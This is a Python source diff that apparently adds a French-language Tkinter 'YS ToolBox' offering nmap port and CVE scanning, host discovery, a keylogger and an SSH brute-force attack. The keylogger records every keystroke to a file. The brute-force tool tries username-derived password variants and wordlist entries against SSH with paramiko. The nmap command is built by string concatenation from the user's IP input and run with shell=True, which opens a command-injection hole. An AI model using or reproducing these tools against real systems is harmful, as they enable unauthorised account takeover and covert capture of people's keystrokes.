@@ -1,0 +1,775 @@
+import tkinter as tk
+from tkinter import ttk, messagebox, filedialog, scrolledtext
+import threading
+import subprocess
+import time
+import os
+import re
+import pandas as pd
+import paramiko
+from PIL import Image, ImageTk
+from pynput import keyboard
+import nmap
+from datetime import datetime
+
+class YSToolBox(tk.Tk):
+    def __init__(self):
+        super().__init__()
+        self.title("YS ToolBox")
+        self.geometry("800x600")
+        self.configure(bg='navy')
+        self.create_background()
+        self.create_menu()
+
+    def create_background(self):
+        self.bg_image = Image.open("C:/Users/Yanis Sekhri/Pictures/imagemenu.png")
+        self.bg_image = self.bg_image.resize((800, 600), Image.LANCZOS)
+        self.bg_photo = ImageTk.PhotoImage(self.bg_image)
+
+        self.bg_label = tk.Label(self, image=self.bg_photo)
+        self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
+
+    def create_menu(self):
+        frame = tk.Frame(self, bg='navy')
+        frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
+
+        tk.Label(frame, text="YS ToolBox", font=("Helvetica", 24, "bold"), bg='navy', fg='white').pack(pady=20)
+
+        button_style = {
+            "font": ("Helvetica", 12, "bold"), 
+            "bg": "#1E90FF",  # Darker blue
+            "fg": "white", 
+            "relief": "solid", 
+            "bd": 2,  # Border width
+            "width": 20, 
+            "height": 2
+        }
+
+        tk.Button(frame, text="NMAP", command=self.open_nmap, **button_style).pack(pady=10)
+        tk.Button(frame, text="Scan de Vulnérabilités", command=self.open_vuln_scan, **button_style).pack(pady=10)
+        tk.Button(frame, text="KEYLOGGER", command=self.open_keylogger, **button_style).pack(pady=10)
+        tk.Button(frame, text="Attaque FORCE BRUTE", command=self.open_bruteforce, **button_style).pack(pady=10)
+        tk.Button(frame, text="Détection MACHINES", command=self.open_machine_detection, **button_style).pack(pady=10)
+
+    def open_nmap(self):
+        NmapWindow(self)
+
+    def open_vuln_scan(self):
+        VulnerabilityScanner(self)
+
+    def open_keylogger(self):
+        KeyloggerWindow(self)
+
+    def open_bruteforce(self):
+        BruteforceAttack(self)
+
+    def open_machine_detection(self):
+        MachineDetection(self)
+
+
+class NmapWindow(tk.Toplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("Scanner de Ports")
+        self.geometry("500x400")
+        self.configure(bg='darkblue')
+        self.create_widgets()
+        self.scan_thread = None
+
+    def create_widgets(self):
+        self.label_ip = ttk.Label(self, text="Adresse IP de la cible :", background='darkblue', foreground='white')
+        self.label_ip.grid(column=0, row=0, padx=10, pady=10)
+        self.entry_ip = ttk.Entry(self)
+        self.entry_ip.grid(column=1, row=0, padx=10, pady=10)
+
+        self.label_ports = ttk.Label(self, text="Plage de ports à scanner (de - à) :", background='darkblue', foreground='white')
+        self.label_ports.grid(column=0, row=1, padx=10, pady=10)
+        self.entry_start_port = ttk.Entry(self, width=5)
+        self.entry_start_port.grid(column=1, row=1, padx=5, pady=10)
+        self.entry_end_port = ttk.Entry(self, width=5)
+        self.entry_end_port.grid(column=2, row=1, padx=5, pady=10)
+
+        self.var_syn = tk.BooleanVar()
+        self.check_syn = ttk.Checkbutton(self, text="Scan Furtif (SYN)", variable=self.var_syn)
+        self.check_syn.grid(column=0, row=3, padx=10, pady=5)
+
+        self.var_version = tk.BooleanVar()
+        self.check_version = ttk.Checkbutton(self, text="Détection de version (-sV)", variable=self.var_version)
+        self.check_version.grid(column=1, row=3, padx=10, pady=5)
+
+        self.var_os = tk.BooleanVar()
+        self.check_os = ttk.Checkbutton(self, text="Détection du système d'exploitation (-O)", variable=self.var_os)
+        self.check_os.grid(column=2, row=3, padx=10, pady=5)
+
+        self.var_aggressive = tk.BooleanVar()
+        self.check_aggressive = ttk.Checkbutton(self, text="Scan agressif (-A)", variable=self.var_aggressive)
+        self.check_aggressive.grid(column=0, row=4, padx=10, pady=5)
+
+        self.btn_scan = tk.Button(self, text="Démarrer le scan", command=self.start_scan, bg='#1E90FF', fg='white')
+        self.btn_scan.grid(column=1, row=5, pady=10)
+
+        self.result_text = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=60, height=15)
+        self.result_text.grid(column=0, row=6, columnspan=3, padx=10, pady=10)
+
+    def start_scan(self):
+        target_ip = self.entry_ip.get()
+        start_port = self.entry_start_port.get()
+        end_port = self.entry_end_port.get()
+
+        if not target_ip or not start_port or not end_port:
+            self.result_text.insert(tk.END, "Veuillez saisir une adresse IP cible et une plage de ports.\n")
+            return
+
+        try:
+            start_port = int(start_port)
+            end_port = int(end_port)
+        except ValueError:
+            self.result_text.insert(tk.END, "Veuillez saisir des numéros de port valides.\n")
+            return
+
+        if start_port > end_port:
+            self.result_text.insert(tk.END, "Le port de début doit être inférieur ou égal au port de fin.\n")
+            return
+
+        nmap_cmd = "nmap"
+        if self.var_syn.get():
+            nmap_cmd += " -sS"
+        if self.var_version.get():
+            nmap_cmd += " -sV"
+        if self.var_os.get():
+            nmap_cmd += " -O"
+        if self.var_aggressive.get():
+            nmap_cmd += " -A"
+        nmap_cmd += f" -p {start_port}-{end_port} {target_ip}"
+
+        self.result_text.insert(tk.END, f"Balayage de ports sur {target_ip}...\n")
+        self.scan_thread = threading.Thread(target=self.run_nmap, args=(nmap_cmd,))
+        self.scan_thread.start()
+
+    def run_nmap(self, nmap_cmd):
+        try:
+            output = subprocess.check_output(nmap_cmd, shell=True, universal_newlines=True)
+            self.result_text.insert(tk.END, output)
+            self.generate_html(output)
+        except subprocess.CalledProcessError as e:
+            self.result_text.insert(tk.END, f"Erreur lors de l'exécution de la commande Nmap : {e.output}\n")
+        except Exception as e:
+            self.result_text.insert(tk.END, f"Erreur inattendue : {e}\n")
+
+    def generate_html(self, nmap_output):
+        ports_info = []
+        lines = nmap_output.splitlines()
+
+        for line in lines:
+            match = re.match(r'(\d+)/(\w+)\s+(\w+)\s+([\w\.-]+)(.*)', line)
+            if match:
+                port = match.group(1)
+                protocol = match.group(2)
+                state = match.group(3)
+                service = match.group(4)
+                additional_info = match.group(5).strip()
+                ports_info.append((port, protocol, state, service, additional_info))
+
+        if not ports_info:
+            self.result_text.insert(tk.END, "Aucune information sur les ports n'a été trouvée.\n")
+            return
+
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Rapport de Scan Nmap</title>
+            <style>
+                body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; }
+                table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
+                th, td { border: 1px solid #ddd; padding: 8px; }
+                th { background-color: #4CAF50; color: white; }
+                tr:nth-child(even) { background-color: #f2f2f2; }
+                tr:hover { background-color: #ddd; }
+            </style>
+        </head>
+        <body>
+            <h2>Rapport de Scan Nmap</h2>
+            <table>
+                <tr>
+                    <th>Port</th>
+                    <th>Protocole</th>
+                    <th>État</th>
+                    <th>Service</th>
+                    <th>Informations supplémentaires</th>
+                </tr>
+        """
+
+        for port_info in ports_info:
+            html_content += "<tr>"
+            for item in port_info:
+                html_content += f"<td>{item}</td>"
+            html_content += "</tr>"
+
+        html_content += """
+            </table>
+            <p>Scan réalisé le: {}</p>
+        </body>
+        </html>
+        """.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+
+        file_name = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+        with open(file_name, 'w') as file:
+            file.write(html_content)
+
+        self.result_text.insert(tk.END, f"Rapport HTML généré : {file_name}\n")
+
+
+class VulnerabilityScanner(tk.Toplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("CVE Scanner")
+        self.geometry("600x400")
+        self.create_widgets()
+
+    def create_widgets(self):
+        frame = tk.Frame(self)
+        frame.pack(pady=20)
+
+        tk.Label(frame, text="Adresse IP ou nom DNS:").grid(row=0, column=0, padx=5, pady=5)
+        self.entry_target = tk.Entry(frame, width=30)
+        self.entry_target.grid(row=0, column=1, padx=5, pady=5)
+
+        scan_button = tk.Button(frame, text="Scan", command=self.on_scan_button_click, bg='#1E90FF', fg='white')
+        scan_button.grid(row=0, column=2, padx=5, pady=5)
+
+        self.results_text = scrolledtext.ScrolledText(self, width=80, height=20)
+        self.results_text.pack(padx=10, pady=10)
+
+    def on_scan_button_click(self):
+        target = self.entry_target.get()
+        if not target:
+            messagebox.showerror("Erreur", "Veuillez entrer une adresse IP ou un nom DNS.")
+            return
+
+        self.results_text.delete(1.0, tk.END)
+        vulnerabilities = self.scan_vulnerabilities(target)
+        results = self.display_vulnerabilities(vulnerabilities)
+        self.results_text.insert(tk.END, results)
+
+        if vulnerabilities:
+            self.generate_report(vulnerabilities)
+
+    def scan_vulnerabilities(self, target):
+        nm = nmap.PortScanner()
+        nm.scan(target, arguments='-sV --script=vulners,version')
+        vulnerabilities = []
+
+        for host in nm.all_hosts():
+            for proto in nm[host].all_protocols():
+                lport = nm[host][proto].keys()
+                for port in lport:
+                    service = nm[host][proto][port]
+                    product = service.get('product', '')
+                    version = service.get('version', '')
+                    cpe = service.get('cpe', '')
+                    if 'script' in service:
+                        for script_id, script_output in service['script'].items():
+                            if 'vulners' in script_id:
+                                vulns = self.extract_vulns_from_output(script_output)
+                                for vuln in vulns:
+                                    vulnerabilities.append({
+                                        'host': host,
+                                        'port': port,
+                                        'service': service['name'],
+                                        'product': product,
+                                        'version': version,
+                                        'cpe': cpe,
+                                        'cve': vuln['cve'],
+                                        'cvss': vuln['cvss'],
+                                        'exploit_available': vuln['exploit']
+                                    })
+
+        return vulnerabilities
+
+    def extract_vulns_from_output(self, output):
+        vulns = []
+        lines = output.split('\n')
+        for line in lines:
+            match = re.search(r'(\S+)\s+(\d+\.\d+)\s+(https://vulners.com/\S+)', line)
+            if match:
+                cve = match.group(1)
+                cvss = match.group(2)
+                exploit = "EXPLOIT" in line
+                vulns.append({'cve': cve, 'cvss': cvss, 'exploit': exploit})
+        return vulns
+
+    def display_vulnerabilities(self, vulnerabilities):
+        if not vulnerabilities:
+            return "No vulnerabilities found."
+        else:
+            result = ""
+            vulnerabilities_with_exploits = [v for v in vulnerabilities if v['exploit_available']]
+            if not vulnerabilities_with_exploits:
+                result += "No vulnerabilities with available exploits found."
+            else:
+                result += f"Found {len(vulnerabilities_with_exploits)} vulnerabilities with available exploits:\n"
+                for vuln in vulnerabilities_with_exploits:
+                    result += (f"\nHost: {vuln['host']}\n"
+                               f"Port: {vuln['port']}\n"
+                               f"Service: {vuln['service']}\n"
+                               f"Product: {vuln['product']}\n"
+                               f"Version: {vuln['version']}\n"
+                               f"CPE: {vuln['cpe']}\n"
+                               f"CVE: {vuln['cve']}\n"
+                               f"CVSS Score: {vuln['cvss']}\n"
+                               f"Exploit Available: {vuln['exploit_available']}\n")
+
+            result += self.display_recommendations(vulnerabilities_with_exploits)
+            return result
+
+    def display_recommendations(self, vulnerabilities):
+        if not vulnerabilities:
+            return "\nNo critical vulnerabilities to address."
+
+        products = set()
+        for vuln in vulnerabilities:
+            product_info = f"{vuln['product']} {vuln['version']}"
+            products.add(product_info)
+
+        result = "\nRecommandations :\n"
+        result += "\nCorriger les vulnérabilités critiques en priorité :\n"
+        result += "Les vulnérabilités avec des scores CVSS élevés et des exploits disponibles doivent être corrigées immédiatement pour éviter tout risque de compromission.\n"
+
+        result += "\nProduits affectés :\n"
+        for product in products:
+            result += f"<span class='critical'>{product}</span><br>"
+
+        result += "\nMettre à jour les logiciels :\n"
+        for product in products:
+            result += f"Assurez-vous que {product} est à jour et que toutes les mises à jour de sécurité sont appliquées.<br>"
+
+        result += "\nSurveiller les vulnérabilités restantes :\n"
+        result += "Même si certaines vulnérabilités ont des scores CVSS faibles ou n'ont pas d'exploit disponible, elles doivent être surveillées et corrigées dès que possible.\n"
+
+        return result
+
+    def generate_report(self, vulnerabilities):
+        df = pd.DataFrame(vulnerabilities)
+        report_path = os.path.join(os.getcwd(), "vulnerability_report.html")
+
+        vuln_count_by_port = df.groupby('port').size().to_dict()
+        vuln_count_by_port_html = "".join(f"<p>Port {port}: {count} vulnerabilities</p>" for port, count in vuln_count_by_port.items())
+
+        df['cve'] = df['cve'].apply(lambda x: f'<a href="https://vulners.com/cve/{x}" target="_blank">{x}</a>')
+        df['cvss'] = df['cvss'].apply(lambda x: f'<span class="highlight">{x}</span>' if float(x) > 8 else x)
+
+        html = df.to_html(classes='table table-striped table-bordered', border=0, escape=False, index=False)
+        recommendations = self.display_recommendations(vulnerabilities)
+
+        with open(report_path, 'w') as f:
+            f.write(f"""
+            <html>
+            <head>
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.2/css/bootstrap.min.css">
+            <style>
+                body {{
+                    font-family: Arial, sans-serif;
+                    margin: 40px;
+                    background-color: #f5f5f5;
+                }}
+                h1 {{
+                    color: #333;
+                }}
+                .table {{
+                    width: 100%;
+                    margin-bottom: 1rem;
+                    color: #212529;
+                    background-color: #fff;
+                }}
+                .table th {{
+                    background-color: #343a40;
+                    color: #fff;
+                }}
+                .table-striped tbody tr:nth-of-type(odd) {{
+                    background-color: rgba(0,0,0,.05);
+                }}
+                .table-bordered {{
+                    border: 1px solid #dee2e6;
+                }}
+                .table-bordered th, .table-bordered td {{
+                    border: 1px solid #dee2e6;
+                }}
+                .highlight {{
+                    color: #d9534f;
+                    font-weight: bold;
+                }}
+                .critical {{
+                    color: #d9534f;
+                    font-weight: bold;
+                }}
+            </style>
+            </head>
+            <body>
+            <h1>Rapport de Vulnérabilités</h1>
+            <h2>Total Vulnerabilities: {len(vulnerabilities)}</h2>
+            <h3>Vulnerabilities by Port:</h3>
+            {vuln_count_by_port_html}
+            {html}
+            <h2>Recommandations</h2>
+            <p>{recommendations}</p>
+            </body>
+            </html>
+            """)
+        messagebox.showinfo("Rapport", f"Le rapport a été généré avec succès : {report_path}")
+
+
+class KeyloggerWindow(tk.Toplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("Keylogger")
+        self.geometry("600x400")
+        self.create_background()
+        self.create_widgets()
+        self.logger = None
+
+    def create_background(self):
+        self.bg_image = Image.open("C:/Users/Yanis Sekhri/Pictures/Keylogger.jpeg")
+        self.bg_image = self.bg_image.resize((600, 400), Image.LANCZOS)
+        self.bg_photo = ImageTk.PhotoImage(self.bg_image)
+
+        self.bg_label = tk.Label(self, image=self.bg_photo)
+        self.bg_label.place(x=0, y=0, relwidth=1, relheight=1)
+
+    def create_widgets(self):
+        frame = tk.Frame(self, bg='', padx=10, pady=10)
+        frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
+
+        self.label = tk.Label(frame, text="Bienvenue sur le Keylogger", bg='#1E90FF', fg='white')
+        self.label.pack(pady=5)
+
+        self.url_label = tk.Label(frame, text="URL à surveiller :", bg='#1E90FF', fg='white')
+        self.url_label.pack(pady=5)
+
+        self.url_entry = tk.Entry(frame, width=50)
+        self.url_entry.pack(pady=5)
+
+        self.start_button = tk.Button(frame, text="Démarrer", command=self.start_logging, bg='#1E90FF', fg='white')
+        self.start_button.pack(pady=5)
+
+        self.stop_button = tk.Button(frame, text="Arrêter", command=self.stop_logging, bg='#1E90FF', fg='white')
+        self.stop_button.pack(pady=5)
+
+        self.open_log_button = tk.Button(frame, text="Ouvrir le fichier de log", command=self.open_log_file_and_close, bg='#1E90FF', fg='white')
+        self.open_log_button.pack(pady=5)
+
+        self.save_log_button = tk.Button(frame, text="Enregistrer le fichier de log sous", command=self.save_log_file_as, bg='#1E90FF', fg='white')
+        self.save_log_button.pack(pady=5)
+
+        self.delete_log_button = tk.Button(frame, text="Supprimer le fichier de log", command=self.delete_log_file, bg='#1E90FF', fg='white')
+        self.delete_log_button.pack(pady=5)
+
+    def start_logging(self):
+        url = self.url_entry.get()
+        if not url:
+            self.label.config(text="Veuillez saisir une URL à surveiller.")
+            return
+
+        self.logger = keyboard.Listener(on_press=self.keyboard_touch)
+        self.logger.start()
+        self.label.config(text=f"Keylogger en cours d'exécution sur {url}")
+
+    def stop_logging(self):
+        if self.logger:
+            self.logger.stop()
+            self.label.config(text="Le keylogger est arrêté.")
+
+    def keyboard_touch(self, key):
+        with open("listkey.txt", 'a') as logs:
+            logs.write(str(key) + '\n')
+
+    def open_log_file_and_close(self):
+        threading.Thread(target=self._open_log_file_and_close).start()
+
+    def _open_log_file_and_close(self):
+        filename = "listkey.txt"
+        if os.path.exists(filename):
+            os.system(f"notepad.exe {filename}")
+            self.destroy()
+        else:
+            self.label.config(text="Le fichier de log n'existe pas encore.")
+
+    def save_log_file_as(self):
+        threading.Thread(target=self._save_log_file_as).start()
+
+    def _save_log_file_as(self):
+        filename = "listkey.txt"
+        if os.path.exists(filename):
+            file_path = tk.filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
+            if file_path:
+                os.rename(filename, file_path)
+                self.label.config(text=f"Fichier de log enregistré sous {file_path}.")
+        else:
+            self.label.config(text="Le fichier de log n'existe pas encore.")
+
+    def delete_log_file(self):
+        threading.Thread(target=self._delete_log_file).start()
+
+    def _delete_log_file(self):
+        filename = "listkey.txt"
+        if os.path.exists(filename):
+            os.remove(filename)
+            self.label.config(text="Fichier de log supprimé.")
+        else:
+            self.label.config(text="Le fichier de log n'existe pas encore.")
+
+
+class BruteforceAttack(tk.Toplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("SSH Brute Force Tool")
+        self.configure(bg='white')
+        self.create_widgets()
+
+    def create_widgets(self):
+        image_path = r"C:\Users\Yanis Sekhri\Pictures\Brute-Force.jpg"  # Change this to your actual image path
+        img = Image.open(image_path)
+        img = img.resize((300, 150), Image.LANCZOS)
+        photo = ImageTk.PhotoImage(img)
+
+        image_label = tk.Label(self, image=photo)
+        image_label.image = photo
+        image_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10)
+
+        tk.Label(self, text="IP Address:", bg='white', fg='black').grid(row=1, column=0, padx=10, pady=5)
+        self.ip_entry = tk.Entry(self)
+        self.ip_entry.grid(row=1, column=1, padx=10, pady=5)
+
+        tk.Label(self, text="Username:", bg='white', fg='black').grid(row=2, column=0, padx=10, pady=5)
+        self.username_entry = tk.Entry(self)
+        self.username_entry.grid(row=2, column=1, padx=10, pady=5)
+
+        tk.Label(self, text="Password File:", bg='white', fg='black').grid(row=3, column=0, padx=10, pady=5)
+        self.password_file_path = tk.StringVar()
+        self.password_file_entry = tk.Entry(self, textvariable=self.password_file_path)
+        self.password_file_entry.grid(row=3, column=1, padx=10, pady=5)
+        browse_button = tk.Button(self, text="Browse", command=self.browse_file, bg='#1E90FF', fg='white')
+        browse_button.grid(row=3, column=2, padx=10, pady=5)
+
+        start_button = tk.Button(self, text="Start Brute Force", command=self.start_bruteforce, bg='#1E90FF', fg='white')
+        start_button.grid(row=4, column=1, pady=10)
+
+        self.output_text = tk.Text(self, height=15, width=70, bg='lightgrey', fg='black')
+        self.output_text.grid(row=5, column=0, columnspan=3, padx=10, pady=10)
+
+        self.output_text.tag_configure("success", foreground="green")
+        self.output_text.tag_configure("failure", foreground="red")
+
+    def browse_file(self):
+        file_path = tk.filedialog.askopenfilename()
+        self.password_file_path.set(file_path)
+
+    def start_bruteforce(self):
+        ip = self.ip_entry.get()
+        username = self.username_entry.get()
+        password_file = self.password_file_path.get()
+
+        if not ip or not username or not password_file:
+            tk.messagebox.showerror("Input Error", "Veuillez remplir tous les champs.")
+            return
+
+        self.output_text.delete(1.0, tk.END)
+        threading.Thread(target=self.ssh_brute_force, args=(ip, username, password_file)).start()
+
+    def ssh_brute_force(self, ip, username, password_file):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            with open(password_file, 'r') as file:
+                passwords = file.readlines()
+        except FileNotFoundError:
+            self.output_text.insert(tk.END, "[!] Fichier de mots de passe introuvable.\n")
+            return None
+        except Exception as e:
+            self.output_text.insert(tk.END, f"[!] Erreur lors de la lecture du fichier de mots de passe : {e}\n")
+            return None
+
+        password_variants = self.generate_password_variants(username)
+        all_passwords = password_variants + [pwd.strip() for pwd in passwords]
+
+        log_content = f"Lancement de l'attaque par force brute sur l'adresse IP {ip} avec l'utilisateur {username}\n\n"
+        password_found = False
+        for password in all_passwords:
+            try:
+                ssh.connect(ip, username=username, password=password)
+                log_content += f"[+] Mot de passe trouvé : {password}\n"
+                self.output_text.insert(tk.END, f"Mot de passe déniché : {password}\n", "success")
+                password_found = True
+                break
+            except paramiko.AuthenticationException:
+                log_content += f"[-] Mot de passe échoué : {password}\n"
+                self.output_text.insert(tk.END, f"Impossible de trouver le mot de passe : {password}\n", "failure")
+            except paramiko.SSHException as sshException:
+                log_content += f"[!] Erreur SSH : {sshException}\n"
+                self.output_text.insert(tk.END, f"[!] Erreur SSH : {sshException}\n")
+                break
+            except Exception as e:
+                log_content += f"[!] Erreur inattendue : {e}\n"
+                self.output_text.insert(tk.END, f"[!] Erreur inattendue : {e}\n")
+                break
+            finally:
+                ssh.close()
+
+        if password_found:
+            log_content += "\n[+] L'attaque par force brute a été couronnée de succès et le mot de passe a été récupéré avec succès.\n"
+        else:
+            log_content += "\n[-] L'attaque par force brute a été menée, mais elle n'a pas abouti.\n"
+
+        self.save_log(log_content)
+
+    def save_log(self, content):
+        log_dir = os.path.join(os.getcwd(), "result-bruteforce")
+        os.makedirs(log_dir, exist_ok=True)
+        log_path = os.path.join(log_dir, "bruteforce_log.txt")
+
+        with open(log_path, 'w') as log_file:
+            log_file.write(content)
+
+        if tk.messagebox.askyesno("Log Saved", "Le fichier de log est enregistré. Voulez-vous l'ouvrir ?"):
+            os.startfile(log_path)
+        else:
+            if tk.messagebox.askyesno("Log Saved", "Le fichier de log est enregistré. Voulez-vous le supprimer ?"):
+                os.remove(log_path)
+                tk.messagebox.showinfo("Log Deleted", "Le fichier de log a été supprimé.")
+            else:
+                tk.messagebox.showinfo("Log Kept", f"Le fichier de log est enregistré à {log_path}")
+
+    def generate_password_variants(self, username):
+        variants = [
+            username,
+            username + '123', username + '!', username + '2023',
+            username + '1234', '123' + username, '!' + username,
+            username.capitalize(), username[::-1],
+            username + '01', username + '02', username + '03',
+            username + '_123', username + '_!', username + '_2023',
+            username + '_2024', username + 'password', 'password' + username,
+            username + '01!', username + '02!', username + '03!',
+            username + 'admin', username + 'admin123', 'admin' + username,
+            username + 'root', 'root' + username, username + 'user',
+            'user' + username, username + 'test', 'test' + username,
+            username + '_test', 'test_' + username, username + 'guest',
+            'guest' + username, username + 'guest123', 'guest123' + username,
+            username + '!2023', username + '!2024', username + '!1234',
+            username + '!password'
+        ]
+        return variants
+
+
+class MachineDetection(tk.Toplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("Nmap GUI")
+        self.configure(bg='navy')
+        self.create_widgets()
+
+    def create_widgets(self):
+        version_info = self.get_nmap_version()
+        tk.Label(self, text=version_info, font=("Helvetica", 10, "italic"), bg='navy', fg='white').grid(row=0, column=0, columnspan=2, pady=5)
+
+        tk.Label(self, text="Adresse IP :", font=("Helvetica", 12), bg='navy', fg='white').grid(row=1, column=0, sticky="e", padx=5, pady=5)
+        self.ip_entry = tk.Entry(self)
+        self.ip_entry.grid(row=1, column=1, padx=5, pady=5)
+
+        button_frame = tk.Frame(self, bg='navy')
+        button_frame.grid(row=2, column=0, columnspan=2, pady=10)
+
+        button_style = {"width": 20, "font": ("Helvetica", 10), "bg": "#1E90FF", "fg": "white"}
+
+        tk.Button(button_frame, text="Détection de machines", command=self.list_machines, **button_style).grid(row=0, column=0, padx=5)
+
+        self.text_area = tk.Text(self, wrap=tk.WORD, width=60, height=15)
+        self.text_area.grid(row=3, column=0, columnspan=2, padx=10, pady=10)
+
+        self.progress_bar = ttk.Progressbar(self, mode='determinate', maximum=100)
+        self.progress_bar.grid(row=4, column=0, columnspan=2, padx=10, pady=10, sticky="ew")
+
+        self.progress_label = tk.Label(self, text="Progress: 0%", font=("Helvetica", 12), bg='navy', fg='white')
+        self.progress_label.grid(row=5, column=0, columnspan=2, pady=5)
+
+    def list_machines(self):
+        threading.Thread(target=self._list_machines).start()
+
+    def _list_machines(self):
+        self.start_progress_continuous()
+        ip_range = self.ip_entry.get()
+        try:
+            process = subprocess.Popen(["nmap", "-sP", ip_range], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            while process.poll() is None:
+                time.sleep(0.1)
+                self.after(0, self.update_progress)
+            stdout, stderr = process.communicate()
+            if process.returncode != 0:
+                raise Exception(stderr)
+            self.text_area.delete('1.0', tk.END)
+            self.text_area.insert(tk.END, stdout)
+            self.generate_html_report(stdout)
+            messagebox.showinfo("Succès", "Le scan des machines disponibles est terminé.")
+        except Exception as e:
+            messagebox.showerror("Erreur", f"Erreur lors du scan des machines : {e}")
+        finally:
+            self.stop_progress()
+
+    def generate_html_report(self, scan_output):
+        lines = scan_output.split('\n')
+        html_content = "<html><head><title>Rapport de détection de machines</title></head><body>"
+        html_content += "<h1>Rapport de détection de machines</h1>"
+        html_content += "<table border='1'><tr><th style='color:red'>Adresse IP</th><th style='color:red'>Nom d'hôte</th><th style='color:red'>Adresse MAC</th></tr>"
+
+        ip_count = 0
+        for line in lines:
+            if "Nmap scan report for" in line:
+                parts = line.split(" ")
+                ip_address = parts[-1]
+                hostname = parts[4] if parts[4] != 'for' else 'N/A'
+                mac_address = 'N/A'
+                html_content += f"<tr><td>{ip_address}</td><td>{hostname}</td><td>{mac_address}</td></tr>"
+                ip_count += 1
+            if "MAC Address:" in line:
+                mac_address = line.split("MAC Address: ")[1].split(" ")[0]
+                html_content = html_content.replace('<td>N/A</td></tr>', f'<td>{mac_address}</td></tr>', 1)
+
+        html_content += "</table>"
+        html_content += f"<p>Nombre total d'adresses IP trouvées : {ip_count}</p>"
+        html_content += "</body></html>"
+
+        with open("detection_report.html", "w") as report_file:
+            report_file.write(html_content)
+
+    def get_nmap_version(self):
+        result = subprocess.run(["nmap", "--version"], capture_output=True, text=True)
+        version_info = result.stdout.split('\n')[0]
+        return version_info
+
+    def start_progress(self):
+        self.progress_bar['value'] = 0
+        self.progress_label['text'] = "Progress: 0%"
+
+    def stop_progress(self):
+        self.progress_bar['value'] = 100
+        self.progress_label['text'] = "Progress: 100%"
+
+    def start_progress_continuous(self):
+        self.progress_bar['value'] = 0
+        self.progress_label['text'] = "Progress: 0%"
+        self.after(100, self.update_progress)
+
+    def update_progress(self):
+        current_value = self.progress_bar['value']
+        if current_value < 100:
+            new_value = current_value + 1
+            if new_value > 100:
+                new_value = 100
+            self.progress_bar['value'] = new_value
+            self.progress_label['text'] = f"Progress: {new_value}%"
+            self.after(100, self.update_progress)
+
+
+if __name__ == "__main__":
+    app = YSToolBox()
+    app.mainloop()
